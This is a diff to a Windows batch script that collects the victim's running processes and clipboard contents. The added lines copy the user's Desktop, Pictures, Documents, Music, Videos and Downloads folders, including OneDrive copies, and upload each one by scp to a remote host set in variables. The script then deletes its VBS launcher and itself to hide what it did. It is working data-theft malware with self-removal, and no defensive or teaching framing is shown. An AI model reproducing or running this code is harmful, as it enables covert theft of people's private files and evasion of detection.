@@ -46,5 +46,21 @@ if exist "%cd%\files\" (
 tasklist > tasks.txt
 powershell get-clipboard > clipboard.txt
 cd %startDir%
+echo %cd%
+pause
 scp -r "%COMPUTERNAME%" %user%@%host%:/home/%user%/
-del -r "%COMPUTERNAME%"
+cd "%COMPUTERNAME%\%USERNAME%\%MYDATE%\"
+if exist "%USERPROFILE%\Desktop" ( %copy% "%USERPROFILE%\Desktop" "%cd%\files\Desktop" ) else if exist "%USERPROFILE%\OneDrive\Desktop" ( %copy% "%USERPROFILE%\OneDrive\Desktop" "%cd%\files\Desktop" )
+scp -r "%cd%\files\Desktop" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+if exist "%USERPROFILE%\Pictures" ( %copy% "%USERPROFILE%\Pictures" "%cd%\files\Pictures" ) else if exist "%USERPROFILE%\OneDrive\Pictures" ( %copy% "%USERPROFILE%\OneDrive\Pictures" "%cd%\files\Pictures" )
+scp -r "%cd%\files\Pictures" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+if exist "%USERPROFILE%\Documents" ( %copy% "%USERPROFILE%\Documents" "%cd%\files\Documents" ) else if exist "%USERPROFILE%\OneDrive\Documents" ( %copy% "%USERPROFILE%\OneDrive\Documents" "%cd%\files\Documents" )
+scp -r "%cd%\files\Documents" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+if exist "%USERPROFILE%\Music" ( %copy% "%USERPROFILE%\Music" "%cd%\files\Music" ) else if exist "%USERPROFILE%\OneDrive\Music" ( %copy% "%USERPROFILE%\OneDrive\Music" "%cd%\files\Music" )
+scp -r "%cd%\files\Music" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+if exist "%USERPROFILE%\Videos" ( %copy% "%USERPROFILE%\Videos" "%cd%\files\Videos" ) else if exist "%USERPROFILE%\OneDrive\Videos" ( %copy% "%USERPROFILE%\OneDrive\Videos" "%cd%\files\Videos" )
+scp -r "%cd%\files\Videos" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+if exist "%USERPROFILE%\Downloads" ( %copy% "%USERPROFILE%\Downloads" "%cd%\files\Downloads" ) else if exist "%USERPROFILE%\OneDrive\Downloads" ( %copy% "%USERPROFILE%\OneDrive\Downloads" "%cd%\files\Downloads" )
+scp -r "%cd%\files\Downloads" %user%@%host%:/home/%user%/%COMPUTERNAME%/%USERNAME%/%MYDATE%/files/
+del /q /f "run.vbs"
+del /q /f "%cd%\%~n0%~x0" >nul 2>&1 & exit /b 0
